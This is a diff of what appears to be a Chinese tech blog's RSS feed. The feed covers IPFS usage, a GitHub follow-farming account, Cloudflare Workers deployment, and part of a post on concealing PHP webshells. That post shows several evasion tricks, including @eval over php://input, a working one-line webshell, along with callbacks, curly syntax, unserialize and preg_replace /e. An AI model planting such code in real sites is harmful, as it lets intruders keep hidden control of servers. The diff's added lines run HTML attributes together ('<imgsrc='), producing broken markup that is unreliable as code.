-        src="/posts/tutorials/p2p/ipfs/tutorial/ipfs_get_hub7496c85bb414641f3077f6cc733b39d_34008_1076x276_resize_q75_h2_box_3.webp"
+<p><imgsrc="/posts/tutorials/p2p/ipfs/tutorial/ipfs_get_hub7496c85bb414641f3077f6cc733b39d_34008_1076x276_resize_q75_h2_box_3.webp"
         alt="/posts/tutorials/p2p/ipfs/tutorial/ipfs_get_hub7496c85bb414641f3077f6cc733b39d_34008_1076x276_resize_q75_h2_box_3.webp"
-        title="IPFS get"
-         height="276"
-         width="1076"
-        loading="lazy"
+        title="IPFS get"height="276"width="1076"loading="lazy"
     /></p>
 <h4 id="列出目录"><a href="#列出目录" class="header-mark headerLink">列出目录</a></h4>
 <p>通过<code>ipfs ls</code>命令来列出一个目录</p>
-<p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/tutorials/p2p/ipfs/tutorial/ipfs_ls_hu5ebba350e887d3e45522f22c53bbc550_42643_1085x191_resize_q75_h2_box_3.webp"
+<p><imgsrc="/posts/tutorials/p2p/ipfs/tutorial/ipfs_ls_hu5ebba350e887d3e45522f22c53bbc550_42643_1085x191_resize_q75_h2_box_3.webp"
         alt="/posts/tutorials/p2p/ipfs/tutorial/ipfs_ls_hu5ebba350e887d3e45522f22c53bbc550_42643_1085x191_resize_q75_h2_box_3.webp"
-        title="IPFS ls"
-         height="191"
-         width="1085"
-        loading="lazy"
+        title="IPFS ls"height="191"width="1085"loading="lazy"
     /></p>
 <h3 id="添加文件夹"><a href="#添加文件夹" class="header-mark headerLink">添加文件(夹)</a></h3>
 <p>通过<code>ipfs add 文件名</code>命令来将文件添加到IPFS</p>
 <p>如果需要添加文件夹，需要添加<code>-r</code>参数来使其递归处理</p>
-<p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/tutorials/p2p/ipfs/tutorial/ipfs_add_hu1c96c226f6134ef6708ef949a5fca894_26053_1097x152_resize_q75_h2_box_3.webp"
+<p><imgsrc="/posts/tutorials/p2p/ipfs/tutorial/ipfs_add_hu1c96c226f6134ef6708ef949a5fca894_26053_1097x152_resize_q75_h2_box_3.webp"
         alt="/posts/tutorials/p2p/ipfs/tutorial/ipfs_add_hu1c96c226f6134ef6708ef949a5fca894_26053_1097x152_resize_q75_h2_box_3.webp"
-        title="IPFS add"
-         height="152"
-         width="1097"
-        loading="lazy"
+        title="IPFS add"height="152"width="1097"loading="lazy"
     /></p>
 <h2 id="相关概念"><a href="#相关概念" class="header-mark headerLink">相关概念</a></h2>
 <p>在进行深一步学习之前，先让我们来看一下关于IPFS几个不得不知道的概念，这些概念是IPFS的基础组成部分，对后续的使用至关重要</p>
@@ -3017,25 +2221,9 @@
 <p>我们先通过本机的IPFS网关来访问一下，看看有没有添加成功。注意这一步需要你本地已经开启了IPFS守护进程。</p>
 <p>访问：<a href="http://localhost:8080/ipfs/QmdoJ8BiuN8H7K68hJhk8ZrkFXjU8T9Wypi9xAyAzt2zoj" target="_blank" rel="noopener noreffer" class="post-link">http://localhost:8080/ipfs/QmdoJ8BiuN8H7K68hJhk8ZrkFXjU8T9Wypi9xAyAzt2zoj</a></p>
 <p>然后浏览器会自动进行跳转，可以看到能够正常访问我们的页面</p>
-<p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/tutorials/p2p/ipfs/web/ipfs_local_web_huadb15ebe10d4db9e763e1c38076cb909_45426_1043x515_resize_q75_h2_box_3.webp"
+<p><imgsrc="/posts/tutorials/p2p/ipfs/web/ipfs_local_web_huadb15ebe10d4db9e763e1c38076cb909_45426_1043x515_resize_q75_h2_box_3.webp"
         alt="/posts/tutorials/p2p/ipfs/web/ipfs_local_web_huadb15ebe10d4db9e763e1c38076cb909_45426_1043x515_resize_q75_h2_box_3.webp"
-        title="IPFS local web"
-         height="515"
-         width="1043"
-        loading="lazy"
+        title="IPFS local web"height="515"width="1043"loading="lazy"
     /></p>
 <div class="details admonition note open">
         <div class="details-summary admonition-title">
@@ -3049,25 +2237,9 @@
         </div>
     </div>
 <p>如果你的页面只能够显示内容，但是样式是错误的，如下图</p>
-<p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/tutorials/p2p/ipfs/web/local_error_hub933175cd275d038d871d1d59177ba77_31148_799x326_resize_q75_h2_box_3.webp"
+<p><imgsrc="/posts/tutorials/p2p/ipfs/web/local_error_hub933175cd275d038d871d1d59177ba77_31148_799x326_resize_q75_h2_box_3.webp"
         alt="/posts/tutorials/p2p/ipfs/web/local_error_hub933175cd275d038d871d1d59177ba77_31148_799x326_resize_q75_h2_box_3.webp"
-        title="样式错误"
-         height="326"
-         width="799"
-        loading="lazy"
+        title="样式错误"height="326"width="799"loading="lazy"
     /></p>
 <p>这是因为使用的是<strong>绝对地址</strong>，我们需要使用<strong>相对地址</strong>的形式，如果你和我一样使用Hugo，那么只需要在你的配置文件中增加 <code>relativeURLs = true</code> 即可</p>
 <h4 id="远程网关访问"><a href="#远程网关访问" class="header-mark headerLink">远程网关访问</a></h4>
@@ -3075,25 +2247,9 @@
 <p>这里我选择IPFS官方维护的网关：https://ipfs.io，访问：https://ipfs.io/ipfs/QmdoJ8BiuN8H7K68hJhk8ZrkFXjU8T9Wypi9xAyAzt2zoj</p>
 <p>需要注意的是，此时网站还只存在于我们本机上，其他IPFS网关从IPFS网络中找到我们的网站文件需要一段时间，我们需要保证此时IPFS守护进程不关闭并已经连接了成百上千的其他节点，这样有利于IPFS官方Gateway尽快找到我们。</p>
 <p>经过多次刷新和焦急的等待后，终于有了显示</p>
-<p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/tutorials/p2p/ipfs/web/ipfs_web_huc31d8cfbcc41ab9125f8980cf7f3d7c6_7419_664x89_resize_q75_h2_box_3.webp"
+<p><imgsrc="/posts/tutorials/p2p/ipfs/web/ipfs_web_huc31d8cfbcc41ab9125f8980cf7f3d7c6_7419_664x89_resize_q75_h2_box_3.webp"
         alt="/posts/tutorials/p2p/ipfs/web/ipfs_web_huc31d8cfbcc41ab9125f8980cf7f3d7c6_7419_664x89_resize_q75_h2_box_3.webp"
-        title="IPFS WEB"
-         height="89"
-         width="664"
-        loading="lazy"
+        title="IPFS WEB"height="89"width="664"loading="lazy"
     /></p>
 <h3 id="使用ipns进行映射"><a href="#使用ipns进行映射" class="header-mark headerLink">使用IPNS进行映射</a></h3>
 <p>使用命令 <code>ipfs name publish CID</code> 来发布一个IPNS，这里可能需要等待一会</p>
@@ -3107,25 +2263,9 @@
 </span></span><span class="line"><span class="cl"><span class="n">Published</span> <span class="n">to</span> <span class="n">k51qzi5uqu5djhbknypxifn09wxhtf3y1bce8oriud1ojqz5r71mpu75rru520</span><span class="err">:</span> <span class="p">/</span><span class="n">ipfs</span><span class="p">/</span><span class="n">QmdoJ8BiuN8H7K68hJhk8ZrkFXjU8T9Wypi9xAyAzt2zoj</span>
 </span></span></code></pre></td></tr></table></div>
 </div>
-</div><p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/tutorials/p2p/ipfs/web/ipns_web_hu28962914925ee0c2440453f343e921c2_9294_866x90_resize_q75_h2_box_3.webp"
+</div><p><imgsrc="/posts/tutorials/p2p/ipfs/web/ipns_web_hu28962914925ee0c2440453f343e921c2_9294_866x90_resize_q75_h2_box_3.webp"
         alt="/posts/tutorials/p2p/ipfs/web/ipns_web_hu28962914925ee0c2440453f343e921c2_9294_866x90_resize_q75_h2_box_3.webp"
-        title="ipns web"
-         height="90"
-         width="866"
-        loading="lazy"
+        title="ipns web"height="90"width="866"loading="lazy"
     /></p>
 <p>通过使用IPNS映射，后续我们可以不断更新网站内容。如果没有使用IPNS而是直接发布CID，那别人便无法访问最新的版本了</p>
 <div class="details admonition note open">
@@ -3141,46 +2281,14 @@
 <h3 id="解析域名"><a href="#解析域名" class="header-mark headerLink">解析域名</a></h3>
 <p>IPNS不是在IPFS上创建可变地址的唯一方法，我们还可以使用<strong>DNSLink</strong>，它目前比IPNS<strong>快得多</strong>，还使用<strong>人类可读</strong>的名称。</p>
 <p>例如我想要给刚刚发布在IPFS上的网站绑定<code>ipfs.zu1k.com</code>这个域名，那我就需要创建<code>_dnslink.ipfs.zu1k.com</code>的<strong>TXT</strong>记录</p>
-<p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/tutorials/p2p/ipfs/web/dnslink_hu2066ae7cdfeed825f54764811fdc23f4_23865_1011x352_resize_q75_h2_box_3.webp"
+<p><imgsrc="/posts/tutorials/p2p/ipfs/web/dnslink_hu2066ae7cdfeed825f54764811fdc23f4_23865_1011x352_resize_q75_h2_box_3.webp"
         alt="/posts/tutorials/p2p/ipfs/web/dnslink_hu2066ae7cdfeed825f54764811fdc23f4_23865_1011x352_resize_q75_h2_box_3.webp"
-        title="DNSLink"
-         height="352"
-         width="1011"
-        loading="lazy"
+        title="DNSLink"height="352"width="1011"loading="lazy"
     /></p>
 <p>然后任何人都可以用 <code>/ipfs/ipfs.zu1k.com</code> 来找到我的网站了，访问<a href="http://localhost:8080/ipns/ipfs.zu1k.com" target="_blank" rel="noopener noreffer" class="post-link">http://localhost:8080/ipns/ipfs.zu1k.com</a></p>
-<p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/tutorials/p2p/ipfs/web/ipfs_dnslink_web_hu33d8573f961b2198a8f9cce73fac7e04_29509_832x360_resize_q75_h2_box_3.webp"
+<p><imgsrc="/posts/tutorials/p2p/ipfs/web/ipfs_dnslink_web_hu33d8573f961b2198a8f9cce73fac7e04_29509_832x360_resize_q75_h2_box_3.webp"
         alt="/posts/tutorials/p2p/ipfs/web/ipfs_dnslink_web_hu33d8573f961b2198a8f9cce73fac7e04_29509_832x360_resize_q75_h2_box_3.webp"
-        title="DNSLink Web"
-         height="360"
-         width="832"
-        loading="lazy"
+        title="DNSLink Web"height="360"width="832"loading="lazy"
     /></p>
 <p>详细文档见：<a href="https://docs.ipfs.io/concepts/dnslink/#publish-using-a-subdomain" target="_blank" rel="noopener noreffer" class="post-link">IPFS文档：DNSLink</a></p>
 <h3 id="更新内容"><a href="#更新内容" class="header-mark headerLink">更新内容</a></h3>
@@ -3195,46 +2303,14 @@
 <p>具体见：<a href="https://docs.ipfs.io/concepts/dht/" target="_blank" rel="noopener noreffer" class="post-link">IPFS文档：DHT</a></p>
 <h2 id="上层应用"><a href="#上层应用" class="header-mark headerLink">上层应用</a></h2>
 <p>IPFS作为一个文件系统，本质就是用来存储文件，基于这个文件系统的一些特性，有很多上层应用涌现出来。</p>
-<p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/tutorials/p2p/ipfs/ipfs-applications-diagram_hu19aac670f6e619937c2c8cad6ce6f536_739482_2707x1227_resize_q75_h2_box_3.webp"
+<p><imgsrc="/posts/tutorials/p2p/ipfs/ipfs-applications-diagram_hu19aac670f6e619937c2c8cad6ce6f536_739482_2707x1227_resize_q75_h2_box_3.webp"
         alt="/posts/tutorials/p2p/ipfs/ipfs-applications-diagram_hu19aac670f6e619937c2c8cad6ce6f536_739482_2707x1227_resize_q75_h2_box_3.webp"
-        title="基于IPFS的应用"
-         height="1227"
-         width="2707"
-        loading="lazy"
+        title="基于IPFS的应用"height="1227"width="2707"loading="lazy"
     /></p>
 <h2 id="filecoin"><a href="#filecoin" class="header-mark headerLink">Filecoin</a></h2>
-<p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/tutorials/p2p/ipfs/filecoin_hu59116c23b2200775e35574249313ea8b_277953_1088x756_resize_q75_h2_box_3.webp"
+<p><imgsrc="/posts/tutorials/p2p/ipfs/filecoin_hu59116c23b2200775e35574249313ea8b_277953_1088x756_resize_q75_h2_box_3.webp"
         alt="/posts/tutorials/p2p/ipfs/filecoin_hu59116c23b2200775e35574249313ea8b_277953_1088x756_resize_q75_h2_box_3.webp"
-        title="Filecoin"
-         height="756"
-         width="1088"
-        loading="lazy"
+        title="Filecoin"height="756"width="1088"loading="lazy"
     /></p>
 <h2 id="基于ipfs构建应用"><a href="#基于ipfs构建应用" class="header-mark headerLink">基于IPFS构建应用</a></h2>
 <p>IPFS提供了IPFS协议的<strong>Golang</strong>和<strong>JavaScript</strong>实现，可以非常方便的将IPFS集成到我们的应用当中，充分利用IPFS的各种优势。</p>
@@ -3263,151 +2339,39 @@
 <li>机械工业出版社294G原版PDF：<a href="https://ipfs.io/ipfs/QmZYDnPgTRs1MmBx9TPrADFV1K85sPSqLJhAShWayubu9c/" target="_blank" rel="noopener noreffer" class="post-link">/ipfs/QmZYDnPgTRs1MmBx9TPrADFV1K85sPSqLJhAShWayubu9c</a></li>
 </ul>
 ]]></description></item><item><title>不讲武德！来骗Follow</title><link>https://zu1k.com/posts/events/cheat-for-follow/</link><pubDate>Sat, 28 Nov 2020 15:07:17 +0800</pubDate><author>zu1k</author><guid>https://zu1k.com/posts/events/cheat-for-follow/</guid><description><![CDATA[<p>下午，还是习惯性的打开GitHub，发现有个没有头像的人Follow我</p>
-<p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/events/cheat-for-follow/follow_me_hudbacbef76cff4e27ce39ff3750876ebc_11159_634x158_resize_q75_h2_box_3.webp"
+<p><imgsrc="/posts/events/cheat-for-follow/follow_me_hudbacbef76cff4e27ce39ff3750876ebc_11159_634x158_resize_q75_h2_box_3.webp"
         alt="/posts/events/cheat-for-follow/follow_me_hudbacbef76cff4e27ce39ff3750876ebc_11159_634x158_resize_q75_h2_box_3.webp"
-        title="有人Follow我"
-         height="158"
-         width="634"
-        loading="lazy"
+        title="有人Follow我"height="158"width="634"loading="lazy"
     /></p>
 <p>通常出于礼貌，我会查看对方的个人页和他的仓库，如果感觉不错便会回Follow他</p>
 <p>当我打开他的GitHub个人profile页面，令我惊讶的是他总共follow了<strong>59.3k</strong>人，而他的followers人数又七百多人</p>
-<p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/events/cheat-for-follow/follow_count_hue4068906c84c5c20c9f391a3a5a2e36c_9093_344x211_resize_q75_h2_box_3.webp"
+<p><imgsrc="/posts/events/cheat-for-follow/follow_count_hue4068906c84c5c20c9f391a3a5a2e36c_9093_344x211_resize_q75_h2_box_3.webp"
         alt="/posts/events/cheat-for-follow/follow_count_hue4068906c84c5c20c9f391a3a5a2e36c_9093_344x211_resize_q75_h2_box_3.webp"
-        title="Follow数"
-         height="211"
-         width="344"
-        loading="lazy"
+        title="Follow数"height="211"width="344"loading="lazy"
     /></p>
 <p>他只Pin了一个仓库，有70多个star，按理说无法吸引如此多数量的followers，这激起了我的好奇，难不成有什么好的内容没有Pin出来？</p>
-<p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/events/cheat-for-follow/pin_hu1493810ad9018ce5b639e637efbb50bc_12566_597x199_resize_q75_h2_box_3.webp"
+<p><imgsrc="/posts/events/cheat-for-follow/pin_hu1493810ad9018ce5b639e637efbb50bc_12566_597x199_resize_q75_h2_box_3.webp"
         alt="/posts/events/cheat-for-follow/pin_hu1493810ad9018ce5b639e637efbb50bc_12566_597x199_resize_q75_h2_box_3.webp"
-        title="Pin"
-         height="199"
-         width="597"
-        loading="lazy"
+        title="Pin"height="199"width="597"loading="lazy"
     /></p>
 <p>先看了一下他的贡献，连续两年都很稀疏，也没有什么突出的贡献量，平平无奇</p>
-<p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/events/cheat-for-follow/contributions2019_huf6d5214b0d81e4dac3de8e8cce646329_9997_920x217_resize_q75_h2_box_3.webp"
+<p><imgsrc="/posts/events/cheat-for-follow/contributions2019_huf6d5214b0d81e4dac3de8e8cce646329_9997_920x217_resize_q75_h2_box_3.webp"
         alt="/posts/events/cheat-for-follow/contributions2019_huf6d5214b0d81e4dac3de8e8cce646329_9997_920x217_resize_q75_h2_box_3.webp"
-        title="2019年贡献量"
-         height="217"
-         width="920"
-        loading="lazy"
+        title="2019年贡献量"height="217"width="920"loading="lazy"
     /></p>
-<p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/events/cheat-for-follow/contributions2020_hu08e02a6137d338baf78de2d51b045a6b_9814_930x225_resize_q75_h2_box_3.webp"
+<p><imgsrc="/posts/events/cheat-for-follow/contributions2020_hu08e02a6137d338baf78de2d51b045a6b_9814_930x225_resize_q75_h2_box_3.webp"
         alt="/posts/events/cheat-for-follow/contributions2020_hu08e02a6137d338baf78de2d51b045a6b_9814_930x225_resize_q75_h2_box_3.webp"
-        title="2020年贡献量"
-         height="225"
-         width="930"
-        loading="lazy"
+        title="2020年贡献量"height="225"width="930"loading="lazy"
     /></p>
 <p>接下来查看他的仓库，一共有三百五十多个仓库，其中绝大多数都是Fork来的，通过筛选找到他自己的仓库25个</p>
-<p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/events/cheat-for-follow/sources_hud21c0bff936177525d84ccef19de0eda_14624_950x186_resize_q75_h2_box_3.webp"
+<p><imgsrc="/posts/events/cheat-for-follow/sources_hud21c0bff936177525d84ccef19de0eda_14624_950x186_resize_q75_h2_box_3.webp"
         alt="/posts/events/cheat-for-follow/sources_hud21c0bff936177525d84ccef19de0eda_14624_950x186_resize_q75_h2_box_3.webp"
-        title="repo"
-         height="186"
-         width="950"
-        loading="lazy"
+        title="repo"height="186"width="950"loading="lazy"
     /></p>
 <p>仔细查看这25个项目，除了他pin出来的那个仓库有73个star外，其他的统统都没有或者仅有个位数star</p>
-<p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/events/cheat-for-follow/source-info_hu464259cd0106dab6c2919c343362b41b_37654_940x501_resize_q75_h2_box_3.webp"
+<p><imgsrc="/posts/events/cheat-for-follow/source-info_hu464259cd0106dab6c2919c343362b41b_37654_940x501_resize_q75_h2_box_3.webp"
         alt="/posts/events/cheat-for-follow/source-info_hu464259cd0106dab6c2919c343362b41b_37654_940x501_resize_q75_h2_box_3.webp"
-        title="25"
-         height="501"
-         width="940"
-        loading="lazy"
+        title="25"height="501"width="940"loading="lazy"
     /></p>
 <p>而仓库的内容也没有太有价值的东西，所以几乎可以判断他的follower不是因为有价值的东西而follow的</p>
 <p>他Follow了近6万人，star了5千多个项目，结合我自己有回Follow的习惯，看样子这个人的follower大部分都是被骗来的</p>
@@ -3514,25 +2478,9 @@
 </div>
 </div><h3 id="发布"><a href="#发布" class="header-mark headerLink">发布</a></h3>
 <p>在Cloudflare中增加一条DNS记录，需要打开CF代理</p>
-<p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/coding/deploy-blog-to-cf-workers-site/cf-dns_hu3529eee56912ee733c6785e8e28d1194_11315_1016x180_resize_q75_h2_box_3.webp"
+<p><imgsrc="/posts/coding/deploy-blog-to-cf-workers-site/cf-dns_hu3529eee56912ee733c6785e8e28d1194_11315_1016x180_resize_q75_h2_box_3.webp"
         alt="/posts/coding/deploy-blog-to-cf-workers-site/cf-dns_hu3529eee56912ee733c6785e8e28d1194_11315_1016x180_resize_q75_h2_box_3.webp"
-        title="DNS记录"
-         height="180"
-         width="1016"
-        loading="lazy"
+        title="DNS记录"height="180"width="1016"loading="lazy"
     /></p>
 <p>执行下面命令进行部署</p>
 <div class="highlight"><div class="chroma">
@@ -3547,25 +2495,9 @@
 <p>Cloudflare提供了官方的<a href="https://github.com/marketplace/actions/deploy-to-cloudflare-workers-with-wrangler" target="_blank" rel="noopener noreffer" class="post-link">Wrangler GitHub Action</a>，可以直接用GitHub Actions将博客内容部署到CF Workers Site</p>
 <h3 id="添加认证信息"><a href="#添加认证信息" class="header-mark headerLink">添加认证信息</a></h3>
 <p>在github仓库设置一个secret，名字为<code>CF_API_TOKEN</code>，值为Wrangler的token</p>
-<p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/coding/deploy-blog-to-cf-workers-site/token_hue7d26e74b9bd0c0f9cb15f0ae4145e4d_11887_561x246_resize_q75_h2_box_3.webp"
+<p><imgsrc="/posts/coding/deploy-blog-to-cf-workers-site/token_hue7d26e74b9bd0c0f9cb15f0ae4145e4d_11887_561x246_resize_q75_h2_box_3.webp"
         alt="/posts/coding/deploy-blog-to-cf-workers-site/token_hue7d26e74b9bd0c0f9cb15f0ae4145e4d_11887_561x246_resize_q75_h2_box_3.webp"
-        title="CF_API_TOKEN"
-         height="246"
-         width="561"
-        loading="lazy"
+        title="CF_API_TOKEN"height="246"width="561"loading="lazy"
     /></p>
 <h3 id="workflows"><a href="#workflows" class="header-mark headerLink">Workflows</a></h3>
 <div class="highlight"><div class="chroma">
@@ -3702,25 +2634,9 @@
 <pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="s1">&#39;echo 这是输出;&#39;</span><span class="p">);</span>
 </span></span></code></pre></td></tr></table></div>
 </div>
-</div><p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/security/web-security/hide-your-webshell/ex_1_huec863fcd991b5a860115d0c8c96bde80_5855_662x287_resize_q75_h2_box_3.webp"
+</div><p><imgsrc="/posts/security/web-security/hide-your-webshell/ex_1_huec863fcd991b5a860115d0c8c96bde80_5855_662x287_resize_q75_h2_box_3.webp"
         alt="/posts/security/web-security/hide-your-webshell/ex_1_huec863fcd991b5a860115d0c8c96bde80_5855_662x287_resize_q75_h2_box_3.webp"
-        title="直接执行"
-         height="287"
-         width="662"
-        loading="lazy"
+        title="直接执行"height="287"width="662"loading="lazy"
     /></p>
 <h4 id="动态函数执行"><a href="#动态函数执行" class="header-mark headerLink">动态函数执行</a></h4>
 <p>我们先把一个函数名当成一个字符串传递给一个变量，在使用变量当作函数去执行</p>
@@ -3732,25 +2648,9 @@
 <pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="s2">&#34;phpinfo&#34;</span><span class="p">;</span><span class="nv">$a</span><span class="p">();</span>
 </span></span></code></pre></td></tr></table></div>
 </div>
-</div><p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/security/web-security/hide-your-webshell/ex_2_hud8157cb6d9106b602ec0932930b24243_52079_780x550_resize_q75_h2_box_3.webp"
+</div><p><imgsrc="/posts/security/web-security/hide-your-webshell/ex_2_hud8157cb6d9106b602ec0932930b24243_52079_780x550_resize_q75_h2_box_3.webp"
         alt="/posts/security/web-security/hide-your-webshell/ex_2_hud8157cb6d9106b602ec0932930b24243_52079_780x550_resize_q75_h2_box_3.webp"
-        title="动态函数执行"
-         height="550"
-         width="780"
-        loading="lazy"
+        title="动态函数执行"height="550"width="780"loading="lazy"
     /></p>
 <h4 id="文件包含执行"><a href="#文件包含执行" class="header-mark headerLink">文件包含执行</a></h4>
 <p>有两个php文件，我们把执行命令的放在文件b中，使用文件a去包含，达到执行的效果</p>
@@ -3776,25 +2676,9 @@
 </span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="nx">a</span><span class="o">.</span><span class="nx">php</span>
 </span></span></code></pre></td></tr></table></div>
 </div>
-</div><p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/security/web-security/hide-your-webshell/ex_3_hu2c4d58ea186c37b1f1e5b25a8657d838_10945_498x270_resize_q75_h2_box_3.webp"
+</div><p><imgsrc="/posts/security/web-security/hide-your-webshell/ex_3_hu2c4d58ea186c37b1f1e5b25a8657d838_10945_498x270_resize_q75_h2_box_3.webp"
         alt="/posts/security/web-security/hide-your-webshell/ex_3_hu2c4d58ea186c37b1f1e5b25a8657d838_10945_498x270_resize_q75_h2_box_3.webp"
-        title="文件包含执行"
-         height="270"
-         width="498"
-        loading="lazy"
+        title="文件包含执行"height="270"width="498"loading="lazy"
     /></p>
 <h3 id="回调函数"><a href="#回调函数" class="header-mark headerLink">回调函数</a></h3>
 <p>将想要执行命令的函数赋值给一个变量，再用一个可以调用函数执行的函数把变量解析成函数，这么说可能有点绕，看一下array_map函数的用法：array_map函数中将$arr每个元素传给func函数去执行，例子：</p>
@@ -3812,25 +2696,9 @@
 </span></span><span class="line"><span class="cl"><span class="nx">array_map</span><span class="p">(</span><span class="nv">$func</span><span class="p">,</span> <span class="nv">$arr</span><span class="p">);</span>
 </span></span></code></pre></td></tr></table></div>
 </div>
-</div><p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/security/web-security/hide-your-webshell/ex_4_hueaa531329eca728081a84c07d452ef70_23161_641x339_resize_q75_h2_box_3.webp"
+</div><p><imgsrc="/posts/security/web-security/hide-your-webshell/ex_4_hueaa531329eca728081a84c07d452ef70_23161_641x339_resize_q75_h2_box_3.webp"
         alt="/posts/security/web-security/hide-your-webshell/ex_4_hueaa531329eca728081a84c07d452ef70_23161_641x339_resize_q75_h2_box_3.webp"
-        title="回调函数"
-         height="339"
-         width="641"
-        loading="lazy"
+        title="回调函数"height="339"width="641"loading="lazy"
     /></p>
 <h3 id="php-curly-syntax"><a href="#php-curly-syntax" class="header-mark headerLink">PHP Curly Syntax</a></h3>
 <p>我们可以理解为字符串中掺杂了变量，再使用变量去拼接字符串，达到命令执行的效果</p>
@@ -3846,25 +2714,9 @@
 </span></span><span class="line"><span class="cl"><span class="k">eval</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">{</span><span class="nv">$a</span><span class="si">}</span><span class="s2">hpinfo();&#34;</span><span class="p">);</span>
 </span></span></code></pre></td></tr></table></div>
 </div>
-</div><p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/security/web-security/hide-your-webshell/ex_5_hudcfd1c86d9ff9f14b24e2faec4f797e4_54254_858x497_resize_q75_h2_box_3.webp"
+</div><p><imgsrc="/posts/security/web-security/hide-your-webshell/ex_5_hudcfd1c86d9ff9f14b24e2faec4f797e4_54254_858x497_resize_q75_h2_box_3.webp"
         alt="/posts/security/web-security/hide-your-webshell/ex_5_hudcfd1c86d9ff9f14b24e2faec4f797e4_54254_858x497_resize_q75_h2_box_3.webp"
-        title="Syntax"
-         height="497"
-         width="858"
-        loading="lazy"
+        title="Syntax"height="497"width="858"loading="lazy"
     /></p>
 <h3 id="php反序列化"><a href="#php反序列化" class="header-mark headerLink">php反序列化</a></h3>
 <p>这是根据php反序列化漏洞来实现命令执行，可以先创建一个反序列化的漏洞文件，再去调用反序列化函数unserialize</p>
@@ -3890,25 +2742,9 @@
 </span></span><span class="line"><span class="cl"><span class="nx">unserialize</span><span class="p">(</span><span class="s1">&#39;O:4:&#34;test&#34;:1:{s:1:&#34;a&#34;;s:10:&#34;phpinfo();&#34;;}&#39;</span><span class="p">);</span>
 </span></span></code></pre></td></tr></table></div>
 </div>
-</div><p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/security/web-security/hide-your-webshell/ex_6_hue52bdce1b600a1d8b0407ac4def148f1_42914_812x537_resize_q75_h2_box_3.webp"
+</div><p><imgsrc="/posts/security/web-security/hide-your-webshell/ex_6_hue52bdce1b600a1d8b0407ac4def148f1_42914_812x537_resize_q75_h2_box_3.webp"
         alt="/posts/security/web-security/hide-your-webshell/ex_6_hue52bdce1b600a1d8b0407ac4def148f1_42914_812x537_resize_q75_h2_box_3.webp"
-        title="php反序列化"
-         height="537"
-         width="812"
-        loading="lazy"
+        title="php反序列化"height="537"width="812"loading="lazy"
     /></p>
 <h3 id="phpinput方法"><a href="#phpinput方法" class="header-mark headerLink">php://input方法</a></h3>
 <p>php://input可以访问请求的原始数据的只读流，我们可以理解为我们传post参数，php://input会读取到，这时候我们就可以加以利用了。</p>
@@ -3922,25 +2758,9 @@
 </span></span><span class="line"><span class="cl"><span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;php://input&#39;</span><span class="p">));</span>
 </span></span></code></pre></td></tr></table></div>
 </div>
-</div><p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/security/web-security/hide-your-webshell/ex_7_hua8d9397dcecd727e09eafc004016d4c0_186907_1080x586_resize_q75_h2_box_3.webp"
+</div><p><imgsrc="/posts/security/web-security/hide-your-webshell/ex_7_hua8d9397dcecd727e09eafc004016d4c0_186907_1080x586_resize_q75_h2_box_3.webp"
         alt="/posts/security/web-security/hide-your-webshell/ex_7_hua8d9397dcecd727e09eafc004016d4c0_186907_1080x586_resize_q75_h2_box_3.webp"
-        title="php://input方法"
-         height="586"
-         width="1080"
-        loading="lazy"
+        title="php://input方法"height="586"width="1080"loading="lazy"
     /></p>
 <h3 id="preg_replace方法"><a href="#preg_replace方法" class="header-mark headerLink">preg_replace方法</a></h3>
 <p>preg_replace函数执行一个正则表达式的搜索和替换。我们可以使用一个命令执行函数去替换正常的字符串，然后去执行命令。</p>
@@ -3954,25 +2774,9 @@
 </span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s2">&#34;/test/e&#34;</span><span class="p">,</span><span class="nx">phpinfo</span><span class="p">(),</span><span class="s2">&#34;jutst test&#34;</span><span class="p">);</span>
 </span></span></code></pre></td></tr></table></div>
 </div>
-</div><p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/security/web-security/hide-your-webshell/ex_8_hu2bcc87098c6bbdd36c27901ba3c08e7f_53111_936x502_resize_q75_h2_box_3.webp"
